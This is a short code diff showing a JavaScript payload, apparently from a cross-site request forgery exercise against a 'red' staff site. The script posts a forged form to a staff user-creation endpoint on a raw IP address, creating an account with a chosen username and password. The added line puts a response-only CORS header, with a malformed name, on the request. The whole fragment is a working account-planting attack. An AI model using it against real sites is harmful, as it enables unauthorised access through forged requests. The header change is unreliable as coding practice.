@@ -18,6 +18,7 @@
         x = new XMLHttpRequest();
         x.open("POST", "https://104.198.208.81/red/public/staff/users/new.php", true);
         x.setRequestHeader('Content-Type', "application/x-www-form-urlencoded");
+        x.setRequestHeader('Access-Control-Allow-Origin:', "*");
         x.send(
             'first_name=Johnny&last_name=Bravo&username=johnnybravo&email=johnnybravo%40gmail.com&password=111111111Aa%23&confirm_password=111111111Aa%23'
         );
